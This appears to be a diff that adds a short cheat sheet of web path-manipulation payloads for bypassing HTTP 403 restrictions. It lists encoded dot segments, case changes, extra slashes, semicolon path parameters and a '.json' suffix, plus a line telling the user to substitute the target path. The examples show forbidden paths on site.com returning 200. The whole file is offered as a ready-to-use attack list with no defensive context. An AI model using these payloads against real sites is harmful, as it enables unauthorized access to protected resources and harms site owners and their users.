@@ -1,0 +1,13 @@
+/%2e/
+_** /%252e**/
+---- CHANGE SECRET BY THE WORD YOU WANT CHANGE ----
+site.com/secret –> HTTP 403 Forbidden
+site.com/SECRET –> HTTP 200 OK
+site.com/secret/ –> HTTP 200 OK
+site.com/secret/. –> HTTP 200 OK
+site.com//secret// –> HTTP 200 OK
+site.com/./secret/.. –> HTTP 200 OK
+site.com/;/secret –> HTTP 200 OK
+site.com/.;/secret –> HTTP 200 OK
+site.com//;//secret –> HTTP 200 OK
+site.com/secret.json –> HTTP 200 OK (ruby)
